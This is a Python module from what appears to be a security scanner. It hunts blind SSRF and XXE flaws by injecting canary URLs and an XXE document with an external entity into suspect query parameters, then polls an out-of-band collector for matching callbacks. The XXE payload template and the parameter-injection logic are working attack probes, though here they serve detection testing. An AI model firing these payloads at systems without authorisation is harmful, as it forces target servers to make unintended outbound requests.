"""omega/oobhunt.py — OOB callback hunting on top of omega.core.oob.

Generates UNIQUE per-check 32-hex markers and plants blind-vuln
canaries pointing at the OOB collector:

  blind_ssrf_oob — URL-shaped parameters (from the caller's list or
      the built-in suspect list) are set to
      ``<OOB_BASE_URL>/<marker>``.
  xxe_oob — XML-shaped parameters receive an XXE document whose
      external entity resolves to ``<OOB_BASE_URL>/<marker>``.

Polling reuses the existing collector API: when an OOBCallbackServer
handle is supplied, its ``wait_for_hit`` is used; when only a base URL
is configured (env ``OMEGA_OOB_BASE_URL`` or the ``oob_base_url``
argument), the collector is polled over HTTP via its ``_hits`` status
endpoint (GET ``<base>/_hits?token=<marker>`` -> JSON list).

A finding is CONFIRMED (high) only when a callback carrying the
EXACT matching marker is observed. Without any OOB base URL the whole
module skips with a clear note — it never raises.
"""

from __future__ import annotations

import json
import os
import urllib.parse

from omega.probes import Finding, default_fetch

__all__ = [
    "OOBHUNT_SUSPECT_PARAMS",
    "URL_SHAPED_PARAMS",
    "XML_SHAPED_PARAMS",
    "POLL_ATTEMPTS",
    "POLL_SLEEP_S",
    "NO_OOB_NOTE",
    "new_marker",
    "run_oobhunt",
]

OOBHUNT_SUSPECT_PARAMS = [
    "xml", "saml", "doc", "data", "soap", "body", "url", "uri", "src",
    "feed", "fetch", "load", "proxy", "webhook", "callback", "img",
]
URL_SHAPED_PARAMS = {"url", "uri", "src", "feed", "fetch", "load",
                     "proxy", "webhook", "callback", "img"}
XML_SHAPED_PARAMS = {"xml", "saml", "doc", "data", "soap", "body"}

POLL_ATTEMPTS = 5
POLL_SLEEP_S = 0.4

NO_OOB_NOTE = (
    "oobhunt skipped: no OOB base URL configured. Set OMEGA_OOB_BASE_URL "
    "or pass oob_server/oob_base_url to enable out-of-band callback "
    "detection.")
NO_CALLBACK_NOTE = (
    "Absence of an OOB callback is INCONCLUSIVE, not 'secure': the "
    "target may fetch asynchronously or block the collector host.")


def _clip(text, limit=300):
    text = str(text or "")
    return text if len(text) <= limit else text[: limit - 3] + "..."


def new_marker():
    """A fresh unguessable per-check marker (reuse the collector's)."""
    from omega.oob import OOBCallbackServer
    return OOBCallbackServer.new_token()


def _resolve_base(oob_server, oob_base_url):
    """Return (base_url, server_handle_or_None). Never raises."""
    if oob_server is not None and getattr(oob_server, "running", False):
        try:
            return oob_server.base_url().rstrip("/"), oob_server
        except Exception:
            pass
    base = oob_base_url or os.environ.get("OMEGA_OOB_BASE_URL")
    if base:
        return str(base).rstrip("/"), None
    return None, None


def _canary_url(base, marker):
    return "%s/%s" % (base, marker)


def _xxe_document(canary):
    return ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
            '"%s">]><r>&xxe;</r>' % canary)


def _wait(server, marker, timeout_s):
    """Poll for a hit on the EXACT marker. None on timeout/absence."""
    if server is not None:
        try:
            return server.wait_for_hit(marker, timeout_s=timeout_s)
        except Exception:
            return None
    # URL-only mode: poll the collector's _hits status endpoint.
    url = "%s/_hits?%s" % (
        _poll_base[0], urllib.parse.urlencode({"token": marker}))
    import time as _time
    from omega.probes import default_fetch as _fetch
    for _ in range(POLL_ATTEMPTS):
        try:
            status, _h, body = _fetch("GET", url)
            if int(status or 0) == 200:
                hits = json.loads((body or b"").decode("utf-8", "replace"))
                for hit in hits or []:
                    if hit.get("token") == marker:
                        return hit
        except Exception:
            return None
        _time.sleep(POLL_SLEEP_S)
    return None


_poll_base = [None]


def _plant_and_poll(url, param, value, server, marker, fetch, timeout_s):
    """Send one GET with ``param`` = ``value`` then poll for the marker."""
    sep = "&" if "?" in url else "?"
    probe_url = url + sep + urllib.parse.urlencode({param: value})
    try:
        fetch("GET", probe_url)
    except Exception:
        pass  # transport failure: absence stays inconclusive
    hit = _wait(server, marker, timeout_s)
    return probe_url, hit


def _finding(title, param, marker, hit, probe_url):
    return Finding(
        title=title,
        severity="high",
        verification="confirmed",
        verification_note=(
            "OOB callback observed for the exact planted marker"),
        manual_check="re-run with a fresh marker against the OOB collector",
        location="%s [%s]" % (_clip(probe_url, 200), param),
        evidence={
            "param": param,
            "marker": marker,
            "callback_path": _clip((hit or {}).get("path"), 120),
            "callback_remote": (hit or {}).get("remote"),
        },
        source="omega-oobhunt",
    )


# -------------------------------------------------------------- entrypoint

def run_oobhunt(target, params=None, oob_server=None, oob_base_url=None,
                fetch=None, timeout_s=2.0):
    """Plant OOB canaries and poll the collector. Never raises.

    ``params``: injectable-looking parameter names (default: built-in
    suspect list). Returns {findings, ran, skipped, tokens, note}.
    """
    result = {"findings": [], "ran": [], "skipped": {}, "tokens": [],
              "note": NO_CALLBACK_NOTE}
    if fetch is None:
        fetch = default_fetch
    base_url = target if "://" in target else "http://" + target

    base, server = _resolve_base(oob_server, oob_base_url)
    if not base:
        result["skipped"]["oobhunt"] = NO_OOB_NOTE
        result["note"] = NO_OOB_NOTE
        return result
    if server is None:
        _poll_base[0] = base

    names = list(dict.fromkeys(params or OOBHUNT_SUSPECT_PARAMS))
    for param in names:
        marker = new_marker()
        canary = _canary_url(base, marker)
        result["tokens"].append({"param": param, "marker": marker})
        if param in XML_SHAPED_PARAMS:
            value = _xxe_document(canary)
            check = "xxe_oob"
        elif param in URL_SHAPED_PARAMS:
            value = canary
            check = "blind_ssrf_oob"
        else:
            # Host-shaped canary for non-URL, non-XML parameters: the
            # marker rides in the URL path either way.
            value = canary
            check = "blind_ssrf_oob"
        try:
            probe_url, hit = _plant_and_poll(
                base_url, param, value, server, marker, fetch, timeout_s)
        except Exception as exc:
            result["skipped"]["%s:%s" % (check, param)] = _clip(repr(exc), 200)
            continue
        if hit and hit.get("token") == marker:
            result["findings"].append(_finding(
                "Out-of-band callback via parameter '%s' (%s)"
                % (param, check), param, marker, hit, probe_url))
            result["ran"].append("%s:%s" % (check, param))
    return result
